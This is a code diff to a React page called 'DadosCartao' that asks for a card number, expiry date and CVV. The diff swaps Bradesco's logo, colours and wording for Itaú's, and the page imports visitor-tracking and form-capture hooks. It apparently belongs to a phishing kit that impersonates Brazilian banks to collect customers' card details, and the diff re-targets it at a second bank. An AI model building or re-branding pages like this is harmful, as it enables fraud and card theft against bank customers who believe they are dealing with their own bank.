@@ -1,7 +1,7 @@
 import { useState } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Menu, Bell } from "lucide-react";
-import bradescoLogo from "@/assets/bradesco-logo.png";
+import itauLogo from "@/assets/itau-logo.png";
 import BottomNav from "@/components/BottomNav";
 import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";
 
@@ -48,7 +48,7 @@ const DadosCartao = () => {
   };
 
   return (
-    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #D7004D 0%, #A30032 100%)' }}>
+    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #FE5200 0%, #CC4200 100%)' }}>
       {/* Header */}
       <div className="px-5 pt-6 pb-8">
         <div className="flex items-center justify-between mb-8">
@@ -56,7 +56,7 @@ const DadosCartao = () => {
           <Bell className="text-primary-foreground" size={24} />
         </div>
         <div className="flex flex-col items-start gap-3">
-          <img src={bradescoLogo} alt="Bradesco" className="h-8" />
+          <img src={itauLogo} alt="Itaú" className="h-12" />
           <h1 className="text-primary-foreground text-xl font-semibold leading-tight">
             Dados do cartão
           </h1>
@@ -65,7 +65,6 @@ const DadosCartao = () => {
 
       {/* Content */}
       <div className="px-5 pb-32 space-y-6">
-        {/* Número do cartão */}
         <div className="px-1">
           <label className="text-sm text-primary-foreground/80 block mb-1">Número do cartão</label>
           <input
@@ -79,7 +78,6 @@ const DadosCartao = () => {
           {errors.numero && <span className="text-yellow-200 text-xs mt-1 block">{errors.numero}</span>}
         </div>
 
-        {/* Validade e CVV */}
         <div className="flex gap-4">
           <div className="flex-1 px-1">
             <label className="text-sm text-primary-foreground/80 block mb-1">Validade</label>
@@ -107,15 +105,13 @@ const DadosCartao = () => {
           </div>
         </div>
 
-        {/* Helper text */}
         <p className="text-primary-foreground/70 text-sm px-1">
-          Informe os dados do seu cartão Bradesco para continuar.
+          Informe os dados do seu cartão Itaú para continuar.
         </p>
 
-        {/* CTA */}
         <button
           onClick={handleContinuar}
-          className="w-full py-4 rounded-full bg-white text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity"
+          className="w-full py-4 rounded-full bg-white text-[#FE5200] font-semibold text-base hover:bg-white/90 transition-opacity"
         >
           continuar
         </button>
